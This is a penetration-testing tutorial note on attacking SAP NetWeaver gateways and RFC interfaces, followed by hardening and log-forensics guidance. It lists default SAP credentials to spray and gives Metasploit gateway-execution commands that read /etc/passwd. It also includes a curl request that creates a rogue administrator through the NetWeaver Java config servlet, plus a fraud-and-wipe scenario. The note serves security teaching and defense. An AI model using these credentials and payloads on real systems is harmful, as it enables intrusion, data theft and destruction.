---
tags: [network, advanced, ics, scada, sap, vapt]
difficulty: advanced
module: "79 - Advanced Network Services: ICS, SCADA, Mainframes, SAP"
topic: "79.05 Attacking SAP NetWeaver and RFCs"
---

# Attacking SAP NetWeaver and RFCs

## Executive Summary
SAP systems are the absolute backbone of the global economy, handling critical business operations such as Enterprise Resource Planning (ERP), Customer Relationship Management (CRM), Financial Accounting (FI), and Supply Chain Management (SCM) for the world's largest enterprises. The foundational platform for almost all of these applications is the SAP NetWeaver application server. 

Due to their immense complexity, customized ABAP codebases, and critical nature, SAP environments are notoriously difficult to patch, upgrade, and maintain. As a result, they frequently house deeply entrenched misconfigurations, insecure legacy protocols, and known vulnerabilities long after patches are released. The sheer volume of proprietary protocols and services running concurrently on a single SAP server expands the network attack surface significantly.

For an advanced penetration tester, the most lucrative and critical protocol within SAP environments is the **Remote Function Call (RFC)**. RFC is the standard interface for communication between different SAP systems, or between an SAP system and external third-party systems. If an attacker can successfully interact with and exploit improperly secured RFC interfaces, they can often achieve full unauthenticated system compromise, massive data exfiltration, or Remote Code Execution (RCE) at the underlying operating system level.

## SAP Network Footprint and Key Ports
SAP operates on a highly specific set of network ports dictated primarily by the "Instance Number". Every SAP instance is assigned a two-digit number between `00` and `99`. 

Assuming the Instance Number is `00` (which is highly common in default deployments), the critical ports resolve as follows:
- **3200/TCP (32XX):** SAP Dispatcher. This routes client GUI requests from users to the appropriate internal ABAP work processes.
- **3300/TCP (33XX):** SAP Gateway. This component handles all RFC communication. It is the primary target for network-level exploitation and RCE.
- **3299/TCP:** SAPRouter. A proprietary application-level firewall and proxy used to route connections between different SAP networks or to SAP support (OSS).
- **8000/TCP / 44300/TCP:** SAP Web Dispatcher / ICM (Internet Communication Manager) for HTTP/HTTPS web interfaces (WebGUI, Fiori Apps).
- **50000/TCP / 50001/TCP:** SAP NetWeaver AS Java engine.
- **3600/TCP (36XX):** SAP Message Server. Used for load balancing and internal system cluster communication.

## SAP Gateway and RFC Architecture Deep Dive
The SAP Gateway acts as the central bridge for all RFCs. RFCs can be invoked locally within the same instance or remotely over the network from entirely different domains.

There are several types of RFCs (Synchronous, Asynchronous, Transactional), but the security model restricting malicious use relies heavily on two critical Access Control List (ACL) configuration files hosted on the Gateway:
1. **`secinfo` (Security Information):** Defines *who* is allowed to start external programs from the SAP system.
2. **`reginfo` (Registration Information):** Defines which external programs are allowed to *register* themselves at the gateway, and who is permitted to communicate with those registered programs.

In older SAP configurations, or environments that were upgraded poorly without auditing security baselines, these files are either entirely absent or configured with overly permissive wildcards (e.g., `TP=* HOST=*`). This catastrophic misconfiguration allows an unauthenticated network attacker to abuse the RFC interface to execute arbitrary operating system commands.

## ASCII Diagram: SAP RFC Exploitation Architecture

```text
    [Attacker Machine]
    (Kali / Metasploit / PySAP)
          |
          | 1. Network Recon on Port 3300 (SAP Gateway)
          | 2. Identifies permissive secinfo/reginfo ACLs
          V
    +----------------------------------+
    |         SAP Gateway (3300)       |
    |                                  |
    |  [ secinfo / reginfo files ]     |
    |  (Contains: TP=* HOST=* USER=*)  |
    +----------------------------------+
          |
          | 3. Remote Function Call (RFC) Request
          |    (Execute OS Command via 'gwmon' or 
          |     maliciously registered TP program)
          V
    +----------------------------------+
    |      SAP Work Process (ABAP)     |
    |                                  |
    |   CALL 'SYSTEM' ID 'COMMAND'     |
    |   FIELD 'cat /etc/shadow'        |
    +----------------------------------+
          |
          | 4. Command Execution at OS Level
          V
    [ Underlying Operating System (Linux/Windows) ]
    (Execution context: <sid>adm user privileges)
```

## Reconnaissance and Enumeration Methodologies

### 1. Network Discovery
Identifying SAP systems on a vast corporate network is typically achieved by scanning the specific SAP port ranges.
```bash
nmap -p 3200-3299,3300-3399,8000-8099,50000 -sS -T4 -Pn <Target-Subnet>
```

### 2. Gateway and RFC Enumeration
Once an SAP gateway is identified (e.g., port 3300 is open), the attacker must enumerate gateway information to identify the System ID (SID) and evaluate the security posture using Nmap NSE scripts.
```bash
nmap -p 3300 --script sap-rfc-info <Target-IP>
```

Additionally, the Metasploit Framework contains a comprehensive suite of highly specialized SAP auxiliary modules designed by researchers like ERPScan and Onapsis:
```text
use auxiliary/scanner/sap/sap_router_info
use auxiliary/scanner/sap/sap_gateway_info
```
These modules extract the SID, instance number, hostnames, component versions, and importantly, evaluate if the gateway is open to external registration.

## Attack Vectors and Exploitation Techniques

### 1. Default Credentials and Clients
SAP installations come with standard clients (e.g., 000, 001, 066) and highly privileged default administrative users. If these are not actively disabled by Basis administrators or if their passwords are not changed post-installation, they offer a trivial path to total compromise.

**Notable Default Accounts to Spray:**
- `SAP*` : The built-in superuser. (Common Passwords: `06071992`, `pass`, `init`)
- `DDIC` : Data Dictionary admin. (Common Password: `19920706`)
- `EARLYWATCH` : Support user, often left enabled with default passwords for external audits.
- `TMSADM` : Transport Management System user.

An attacker can use the thick SAP GUI client directly to log in using these credentials. Alternatively, they can leverage Metasploit to brute force across all clients rapidly:
```text
use auxiliary/scanner/sap/sap_default_creds
set RHOSTS 192.168.10.100
set RPORT 3200
run
```

### 2. SAP Gateway OS Command Execution (RCE)
If the SAP Gateway lacks proper restrictive ACLs in the `secinfo` and `reginfo` files, an attacker can directly instruct the gateway to execute arbitrary OS commands. This is achieved by exploiting the remote execution functionality of the gateway program.

Tools like **Bizploit** or specific Metasploit modules automate this complex process. The attacker crafts an RFC request that utilizes a standard existing SAP function module (like `RFC_SYSTEM_INFO`, `SXPG_COMMAND_EXECUTE`, or `SAPXPG`) to wrap and run a bash or cmd shell command.

Crucially, these commands execute in the context of the OS user running the SAP instance—typically `<sid>adm` (e.g., `prdadm`). This account holds extreme privileges on the host OS and fundamentally owns all the SAP database files and configuration binaries.

```text
msfconsole> use exploit/multi/sap/sap_gateway_exec
msfconsole> set RHOST 192.168.10.100
msfconsole> set RPORT 3300
msfconsole> set COMMAND "id && cat /etc/passwd"
msfconsole> run
```

### 3. SAP Message Server Misconfiguration
The Message Server (port 36XX) manages the dispatcher queues and handles new application servers joining the cluster. If the internal ACLs (`ms/acl_info`) are not configured, an attacker can register a rogue application server into the production cluster. Once registered, the rogue server can intercept valid user credentials in transit, hijack existing sessions, and participate in internal RFC communications to deeply embed into the SAP ecosystem.

### 4. Invoker Servlet Vulnerability (NetWeaver AS Java)
In SAP NetWeaver AS Java, the `/invoker/` servlet was historically enabled by default and critically lacked authentication checks. This allowed unauthenticated attackers to invoke arbitrary Java classes via HTTP GET/POST parameters. 

By invoking the `ConfigTool` or specific deployment classes, attackers could simply create new administrative users in the NetWeaver portal dynamically. Although officially patched via SAP Security Note 1445998, legacy systems remain highly vulnerable.

*Exploitation via curl to create a rogue Admin user:*
```bash
curl -v "http://192.168.10.100:50000/ctc/servlet/ConfigServlet?param=com.sap.ctc.util.UserManagementConfig;CREATEUSER;username=hacker,password=Hacker123!"
```

## Post-Exploitation and Business Impact
Once a foothold is gained via RFC or default credentials, the business impact is catastrophic:
- **Mass Data Exfiltration:** SAP houses PII, HR data, financial ledgers, and proprietary intellectual property. Attackers can dump database tables silently using RFC read modules (`RFC_READ_TABLE`).
- **Network Pivoting:** The SAP host is often deeply integrated into the internal corporate network, serving as a powerful pivot point to attack backend databases (Oracle, HANA, DB2) or Active Directory domain controllers.
- **Financial Fraud & Ransomware:** Modifying financial tables allows for direct theft. Alternatively, destroying or encrypting SAP database data volumes immediately halts all global business operations, creating immense leverage for ransomware extortion.

## Defense and Hardening Strategies
- **Aggressive Patch Management:** Regularly apply SAP Security Notes. SAP environments must not be excluded from vulnerability management programs.
- **Gateway Security Profiling:** Explicitly configure `secinfo` and `reginfo` files. Never use `TP=* HOST=*`. Restrict external program execution to `localhost` and highly specific, trusted internal IP addresses.
- **Disable Default Passwords:** Actively monitor for the existence of `SAP*` and `DDIC` using default passwords. Use the system parameter `login/no_automatic_user_sapstar = 1` to prevent `SAP*` from automatically recreating itself if deleted.
- **Secure Network Communications (SNC):** Implement SNC to enforce strong encryption and mutual authentication for all SAP GUI and RFC traffic, preventing credential sniffing and man-in-the-middle attacks on the internal network.

## Appendix: Configuration and Log Analysis

### Understanding `secinfo` and `reginfo`

To successfully audit an SAP Gateway, a tester must understand how to read the ACL rules.

**Vulnerable `secinfo` Example:**
```text
USER=* HOST=* TP=*
```
*Impact:* ANY user, from ANY host, can execute ANY program. This is a critical RCE vulnerability.

**Secure `secinfo` Example:**
```text
P TP=sapxpg USER=* HOST=local,10.0.0.50
P TP=* USER=* HOST=local
```
*Impact:* Only the `sapxpg` program can be executed from the local machine or a specific internal management IP (10.0.0.50).

**Vulnerable `reginfo` Example:**
```text
P TP=* HOST=* ACCESS=* CANCEL=*
```
*Impact:* ANY external program can register itself with the gateway, and ANY host can access or cancel it.

**Secure `reginfo` Example:**
```text
P TP=MY_EXTERNAL_APP HOST=10.0.0.100 ACCESS=local CANCEL=local
```
*Impact:* Only a specific application on IP 10.0.0.100 can register, and only the local system can interact with it.

### Forensics and Log Hunting
When responding to a suspected SAP compromise via RFC, investigators should analyze the gateway and developer logs:
1. **`dev_rd` (Gateway Trace File):** This file logs the initialization and communication of the SAP gateway. Look for unexpected `GW_START_PRG` entries indicating external program execution.
2. **`dev_w0`, `dev_w1` (Work Process Logs):** These logs track the ABAP work processes. Look for `SYSTEM_CALL` dumps or database errors resulting from malicious RFC payloads.
3. **`SM21` (System Log):** Within the SAP GUI, transaction SM21 provides a consolidated view of critical system events, including unauthorized login attempts or RFC failures.

## Real-World Attack Scenario

**Scenario: Financial Sabotage via SAP Gateway Abuse**

An organized cybercrime syndicate gains access to a corporate IT network via a successful spear-phishing campaign against a mid-level financial analyst. They perform internal network reconnaissance and identify a monolithic SAP NetWeaver gateway operating on `10.10.50.25:3300`.

Using an open-source SAP auditing script, they determine that the system is a legacy ECC 6.0 deployment. Crucially, the Gateway lacks a populated `secinfo` file, implying that default wildcards are in effect, allowing unauthenticated RFC execution.

The attackers deploy a custom Python script that leverages the `PySAP` library to send an unauthenticated RFC request to the gateway. They invoke an OS command execution payload targeting the underlying SUSE Linux operating system. They establish a stealthy reverse shell running under the `prdadm` (Production Admin) account.

From this highly privileged position, they do not attempt to crack SAP application passwords. Instead, they interact directly with the underlying SAP MaxDB database using native command-line tools available to the `prdadm` user. Over a period of weeks, they stealthily manipulate several rows in the core financial ledger tables, authorizing millions in fraudulent wire transfers to offshore accounts. Before exfiltrating the network, they execute an aggressive `rm -rf` command on the database data volumes, completely destroying the SAP instance to cover their forensic tracks and cause maximum operational chaos, masking the theft.

## Chaining Opportunities
- **Initial Foothold:** Often originates from [[01 - Corporate Phishing and Internal Pivoting]].
- **Lateral Movement:** Can quickly pivot into [[08 - Attacking Oracle and DB2 Databases]] since SAP tightly integrates with heavy relational databases.
- **Privilege Escalation:** OS execution as `<sid>adm` leads directly into [[12 - Linux Local Privilege Escalation Techniques]].

## Related Notes
- [[06 - ERP Security Best Practices]]
- [[07 - SAP Router Abuse and Tunnels]]
- [[10 - Mainframe Subsystem Attacks]]
- [[15 - Advanced Network Exfiltration]]
- [[19 - Auditing SAP Web Dispatcher]]
